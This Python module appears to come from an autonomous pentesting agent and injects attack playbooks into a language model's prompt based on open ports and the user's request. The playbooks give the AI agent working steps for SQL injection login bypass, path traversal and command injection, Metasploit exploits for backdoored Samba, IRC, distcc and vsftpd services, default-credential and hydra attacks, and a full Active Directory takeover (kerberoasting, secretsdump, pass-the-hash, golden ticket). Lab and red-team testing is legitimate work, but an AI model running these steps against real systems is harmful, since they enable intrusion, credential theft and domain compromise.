"""
skills_playbook.py — just-in-time skill/playbook injection (Decepticon-inspired).

Mirrors Decepticon's SkillsMiddleware "progressive disclosure": rather than
front-loading every technique into the system prompt, a compact playbook is
injected into context ONLY when the live attack state makes it relevant — so a
weak local model is grounded on the right approach at the right moment without
bloating every call. Matched skills drop back out when no longer relevant.

Each Skill carries a predicate over the AttackState + the user's request; the
controller injects matched bodies each turn (idempotently, alongside the live
state block).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any, Callable

# Ports that indicate an HTTP application is in play.
WEB_PORTS = {"80", "443", "3000", "5000", "8000", "8080", "8443", "8888"}

_WEB_HINT_RE = re.compile(
    r"\b(https?|web(site|app)?|api|rest|login|sign[-\s]?in|url|endpoint|portal|"
    r"form|juice[-\s]?shop)\b",
    re.IGNORECASE,
)

# Classic remotely-exploitable / backdoored network services (Metasploitable-class).
# Deliberately EXCLUDES 22/80/443: bare SSH is a cred/brute target, and web ports are
# the web playbook's domain — this playbook is about service-side RCE.
NET_EXPLOIT_PORTS = {
    "21", "23", "25", "111", "139", "445", "512", "513", "514", "1099", "1524",
    "2049", "2121", "3306", "3632", "5432", "5900", "6000", "6200", "6667",
    "8009", "8180",
}

_NET_HINT_RE = re.compile(
    r"\b(metasploitable|metasploit|msf|samba|smb|vsftpd|unreal[-\s]?ircd|distcc|"
    r"ingreslock|backdoor|bind[-\s]?shell|reverse[-\s]?shell|command[-\s]execution|"
    r"remote[-\s]code|rce|root[-\s]shell|get[-\s]a[-\s]shell)\b",
    re.IGNORECASE,
)

# Authenticated services where weak/default/reused creds are a foothold.
CRED_SERVICE_PORTS = {
    "21", "22", "23", "25", "110", "143", "139", "445", "1433", "2121",
    "3306", "3389", "5432", "5900", "8180",
}

_CRED_HINT_RE = re.compile(
    r"\b(passwords?|passwd|brute[-\s]?forc\w*|credentials?|default[-\s]cred\w*|"
    r"weak[-\s]passwords?|spray\w*|hydra|medusa|log[-\s]?in|crack\w*|ssh[-\s]keys?|"
    r"reuse\w*|/etc/shadow|kerberoast\w*)\b",
    re.IGNORECASE,
)


def _bare_ports(state: Any) -> set[str]:
    """Port numbers from AttackState.open_ports, tolerating '445' or '445/tcp'."""
    try:
        return {str(p).split("/")[0] for p in (getattr(state, "open_ports", None) or [])}
    except Exception:
        return set()


@dataclass(frozen=True)
class Skill:
    name: str
    matches: Callable[[Any, str], bool]
    body: str


def _is_web_target(state: Any, user_input: str) -> bool:
    """A web app is in play if a web port is open, the target is a URL, or the
    request itself talks about web/http/login."""
    try:
        ports = {str(p) for p in (getattr(state, "open_ports", None) or [])}
    except Exception:
        ports = set()
    if ports & WEB_PORTS:
        return True
    target = getattr(state, "target", "") or ""
    if target.startswith(("http://", "https://")):
        return True
    if ":" in target and target.rsplit(":", 1)[-1] in WEB_PORTS:
        return True
    return bool(_WEB_HINT_RE.search(user_input or ""))


WEB_ATTACK_SKILL = Skill(
    name="web_app_attacks",
    matches=_is_web_target,
    body=(
        "ACTIVE PLAYBOOK — the target is a web application. This overrides recon-"
        "first: interact with the app directly.\n"
        "TOOLING: use `http_request` (structured JSON — payloads with quotes survive "
        "intact), NOT shell curl. The real attack surface is the REST API + request "
        "parameters, not the static HTML. Do NOT call cve_lookup/web_search on a "
        "modern web app — there are no useful results.\n"
        "PICK THE TECHNIQUE BY OBJECTIVE (don't fixate — if a class comes back clean, "
        "move to the next):\n"
        "- AUTH BYPASS / log in as someone else → SQL injection on the login POST: "
        'json_body {"email": "\' OR 1=1--", "password": "anything"} at, in order, '
        "/rest/user/login, /api/login, /login. Success = an auth token for the admin "
        "(e.g. admin@juice-sh.op).\n"
        "- BROKEN ACCESS CONTROL / IDOR → request another user's/object's resource "
        "directly: change the id in /api/<obj>/<id> or /rest/basket/<id>, hit admin-"
        "only endpoints directly, or forge/swap the JWT / Authorization bearer.\n"
        "- READ A FILE / CONFIDENTIAL DOC → path traversal. GET static paths like "
        "/ftp/<file>; traverse with ../ (URL-encode as %2e%2e%2f). Bypass an "
        "extension filter with a poison null byte %2500 (e.g. "
        "/ftp/package.json.bak%2500.md). Juice Shop's confidential file is "
        "/ftp/acquisitions.md.\n"
        "- RCE / LFI VIA A PARAMETER → test injectable params with command injection "
        "(`; id`, `| id`, `$(id)`), path traversal (../../etc/passwd), and SSTI "
        "({{7*7}} or ${7*7} — a returned 49 confirms).\n"
        "- FILE UPLOAD → upload something the server executes or parses (XML→XXE, or "
        "a webshell when extension filters are weak).\n"
        "- SEARCH / QUERY PARAMS → SQLi or NoSQLi in q=, filter=, orderBy=.\n"
        "PROOF = the objective's actual evidence (an admin token, the file's "
        "contents, the flag) returned by a request YOU issued — never a payload you "
        "did not send."
    ),
)

def _is_network_target(state: Any, user_input: str) -> bool:
    """A service-side exploitation target is in play if a classic exploitable
    non-web service port is open, or the request talks about network RCE / named
    Metasploitable services."""
    if _bare_ports(state) & NET_EXPLOIT_PORTS:
        return True
    return bool(_NET_HINT_RE.search(user_input or ""))


NETWORK_ATTACK_SKILL = Skill(
    name="network_service_exploits",
    matches=_is_network_target,
    body=(
        "ACTIVE PLAYBOOK — the target exposes classic exploitable network services "
        "(Metasploitable-class). Follow this NOW; it overrides recon-first stalling.\n"
        "CONTAINMENT RULE (critical): this is an isolated lab with NO route back to "
        "you. A REVERSE shell can never connect out, so NEVER use a reverse/"
        "meterpreter payload. If a module auto-selects one and demands LHOST, that is "
        "the WRONG payload — switch to a BIND payload (or a direct connect). Do NOT "
        "ask the operator for an LHOST; it does not exist here.\n"
        "1. FASTEST WIN FIRST — some ports are ALREADY a shell, no exploit needed. If "
        "1524 (ingreslock) is open it is an open ROOT shell: your next action should "
        "be `shell` with `(echo id; echo cat <PROOF_FILE>) | nc <target> 1524`. This "
        "is usually the single fastest capture — try it before anything fancier.\n"
        "2. For Metasploit you are in stateless CLI mode: sessions do NOT persist "
        "between calls, so msf_run MUST carry a BIND payload AND a post_cmd in the "
        "SAME call. Reliable no-LHOST vectors (pick by open port):\n"
        "   - SMB 139/445 → msf_run(module='exploit/multi/samba/usermap_script', "
        "payload='cmd/unix/bind_netcat', post_cmd='cat <PROOF_FILE>'). Very reliable.\n"
        "   - IRC 6667 → module='exploit/unix/irc/unreal_ircd_3281_backdoor', "
        "payload='cmd/unix/bind_perl', post_cmd='cat <PROOF_FILE>'.\n"
        "   - distcc 3632 → module='exploit/unix/misc/distcc_exec', "
        "payload='cmd/unix/bind_ruby', post_cmd='cat <PROOF_FILE>'.\n"
        "   - FTP 21 vsftpd 2.3.4 → module='exploit/unix/ftp/vsftpd_234_backdoor'. "
        "NOTE: on current Metasploit its 'cmd/unix/interact' payload is GONE — if "
        "PAYLOAD is rejected, do NOT retry it; move to another vector above.\n"
        "3. DON'T FIXATE. If a module errors twice (invalid payload / failed option "
        "validation), PIVOT to a different service/module — fixating on one broken "
        "vector is the failure mode. The 1524 shell and the samba path are your "
        "highest-confidence fallbacks.\n"
        "4. PROOF = the exact contents of the file you were told to read. Actually "
        "run the read in a shell/session and return the FLAG{...} verbatim — do NOT "
        "answer with a command you did not execute."
    ),
)

def _is_credential_target(state: Any, user_input: str) -> bool:
    """A credential attack is in play if an authenticated service is exposed, or
    the request talks about passwords / brute-force / default creds / login."""
    if _bare_ports(state) & CRED_SERVICE_PORTS:
        return True
    return bool(_CRED_HINT_RE.search(user_input or ""))


CREDENTIAL_ATTACK_SKILL = Skill(
    name="credential_attacks",
    matches=_is_credential_target,
    body=(
        "ACTIVE PLAYBOOK — the target exposes authenticated services, so weak, "
        "default, or reused credentials are often the FASTEST foothold. Follow this "
        "NOW. Only the operator's named target is in scope — never spray other hosts.\n"
        "1. DEFAULT / KNOWN CREDS FIRST — try these before ANY brute-force; on "
        "Metasploitable-class boxes they usually just work: msfadmin:msfadmin, "
        "user:user, service:service, postgres:postgres, root:(blank), "
        "tomcat:tomcat and tomcat:s3cret (Tomcat manager on 8180), mysql root:(blank).\n"
        "2. Your attacker box has NO ssh/ftp/mysql CLIENT installed — do NOT shell out "
        "to `ssh`/`ftp`. Use Metasploit's login scanners via msf_run (stateless CLI "
        "mode: found creds print to the output, and a successful ssh_login also opens "
        "a session):\n"
        "   - SSH 22 → msf_run(module='auxiliary/scanner/ssh/ssh_login', "
        "options='{\"USERNAME\":\"msfadmin\",\"PASSWORD\":\"msfadmin\"}', "
        "post_cmd='cat <PROOF_FILE>')\n"
        "   - SMB 445 → auxiliary/scanner/smb/smb_login (SMBUser/SMBPass or "
        "USER_FILE/PASS_FILE)\n"
        "   - MySQL 3306 → auxiliary/scanner/mysql/mysql_login  |  Postgres 5432 → "
        "auxiliary/scanner/postgres/postgres_login  |  FTP 21 → "
        "auxiliary/scanner/ftp/ftp_login\n"
        "   For a spray, set USER_FILE/PASS_FILE to a SMALL list (echo a few common "
        "creds to a file); keep lists tiny in a lab. Or `kali_run`/`shell` hydra: "
        "`hydra -l <user> -P <list> <target> ssh`.\n"
        "3. FOOTHOLD = authenticate with the creds you found. A successful ssh_login "
        "opens a session — pass post_cmd='cat <PROOF_FILE>' to read the proof in the "
        "SAME call (CLI sessions do not persist between calls).\n"
        "4. POST-EX LOOT → LATERAL: once in, harvest /etc/shadow, DB creds, and SSH "
        "keys, and REUSE found passwords across other services/hosts.\n"
        "5. PROOF = actually authenticate and read the file's contents; return the "
        "FLAG{...} verbatim. Never answer with a credential you did not validate."
    ),
)

# Active Directory / Windows-domain services. Kerberos (88) is the strongest single
# tell; LDAP/GC/WinRM reinforce it. Deliberately does NOT include bare 445/139 (a
# standalone Samba box is the network/credential playbook's domain, not AD).
AD_PORTS = {"88", "389", "636", "3268", "3269", "464", "5985", "5986"}

_AD_HINT_RE = re.compile(
    r"\b(active[-\s]?directory|domain[-\s]?controller|kerberos|kerberoast\w*|"
    r"as[-\s]?rep|bloodhound|ntlm|pass[-\s]?the[-\s]?hash|secretsdump|dcsync|"
    r"golden[-\s]?ticket|net-?exec|crackmapexec|impacket|evil-?winrm|ldap|"
    r"windows[-\s]?domain)\b",
    re.IGNORECASE,
)


def _is_ad_target(state: Any, user_input: str) -> bool:
    """An AD / Windows domain is in play if a domain-service port (Kerberos, LDAP,
    Global Catalog, WinRM) is open, or the request names AD tooling/techniques."""
    if _bare_ports(state) & AD_PORTS:
        return True
    return bool(_AD_HINT_RE.search(user_input or ""))


AD_ATTACK_SKILL = Skill(
    name="active_directory_attacks",
    matches=_is_ad_target,
    body=(
        "ACTIVE PLAYBOOK — an Active Directory / Windows domain is in play "
        "(Kerberos/LDAP/SMB). This is the highest-yield enterprise path; work it in "
        "order. Only the operator's named targets/subnet are in scope.\n"
        "TOOLING: drive Kali tools via kali_run/shell — netexec (nxc) or "
        "crackmapexec, impacket-* (GetNPUsers/GetUserSPNs/secretsdump/psexec), "
        "bloodhound-python, kerbrute, ldapsearch, evil-winrm. Get the DOMAIN name and "
        "a DC IP first (nxc smb <dc>) — most tools need `-d <domain> --dc-ip <ip>`.\n"
        "1. ENUMERATE (works even unauthenticated): `nxc smb <dc> -u '' -p ''` (null "
        "session → users, shares, password policy); `nxc ldap <dc>` / ldapsearch and "
        "`enum4linux-ng <dc>` for users/SPNs. Build a users.txt.\n"
        "2. GET A FIRST CRED (no creds yet): AS-REP roast users without pre-auth — "
        "`impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <ip> -no-pass` → "
        "crack the $krb5asrep$ (hashcat -m 18200). Or PASSWORD SPRAY carefully "
        "(mind lockout): `nxc smb <dc> -u users.txt -p 'Winter2025!' "
        "--continue-on-success`, plus username==password.\n"
        "3. WITH ANY DOMAIN CRED — escalate: KERBEROAST `impacket-GetUserSPNs "
        "<domain>/<user>:<pass> -dc-ip <ip> -request` → crack $krb5tgs$ (-m 13100). "
        "MAP THE GRAPH `bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> "
        "-c all` → shortest path to Domain Admin (GenericAll/WriteDACL, unconstrained "
        "delegation, DCSync rights). SPRAY the cred across hosts to find local admin "
        "(`nxc smb <subnet> -u <user> -p <pass>` → look for Pwn3d!).\n"
        "4. LATERAL / DUMP: where you're admin — `impacket-secretsdump "
        "<domain>/<user>:<pass>@<host>` (SAM/LSA) or `nxc smb <host> ... --sam --lsa`; "
        "shell via `evil-winrm -i <host> -u <user> -p <pass>` or impacket-psexec/"
        "wmiexec. PASS-THE-HASH with a dumped NTLM: `nxc smb <host> -u <user> "
        "-H <hash>` (no plaintext needed).\n"
        "5. DOMAIN TAKEOVER: with DA or DCSync rights → `impacket-secretsdump "
        "-just-dc <domain>/<user>:<pass>@<dc>` dumps every hash incl. krbtgt "
        "(→ golden ticket = persistent domain control).\n"
        "DON'T FIXATE: if a host/vector is dead, spray the next — BloodHound tells "
        "you where to aim. PROOF = actual tool output (a cracked cred, a shell, a "
        "dumped hash); never invent it."
    ),
)

# The active skill set. Kept tiny on purpose; more skills (LFI, SSTI, cloud) slot
# in here the same way.
SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL,
                       AD_ATTACK_SKILL]

# File-authored skills (SKILL.md, loaded via core/skill_format.py) register here, so
# an operator can drop a Markdown playbook into a skills/ dir and have it injected the
# same way as the built-ins — no code change. Kept separate so a reload can replace
# just the file-authored set without disturbing the built-ins.
_REGISTERED_SKILLS: list[Skill] = []


def register_skill(skill: Skill) -> None:
    """Add a skill to the injectable set (replacing any with the same name)."""
    global _REGISTERED_SKILLS
    _REGISTERED_SKILLS = [s for s in _REGISTERED_SKILLS if s.name != skill.name]
    _REGISTERED_SKILLS.append(skill)


def clear_registered_skills() -> None:
    """Drop all file-authored skills (used by a reload / by tests)."""
    _REGISTERED_SKILLS.clear()


def registered_skills() -> list[Skill]:
    return list(_REGISTERED_SKILLS)


def all_skills() -> list[Skill]:
    """Built-in skills followed by file-authored ones."""
    return SKILLS + _REGISTERED_SKILLS


def relevant_skills(state: Any, user_input: str = "") -> list[str]:
    """Bodies of the skills whose predicate matches the current state/request."""
    out: list[str] = []
    for skill in all_skills():
        try:
            if skill.matches(state, user_input):
                out.append(skill.body)
        except Exception:
            continue
    return out
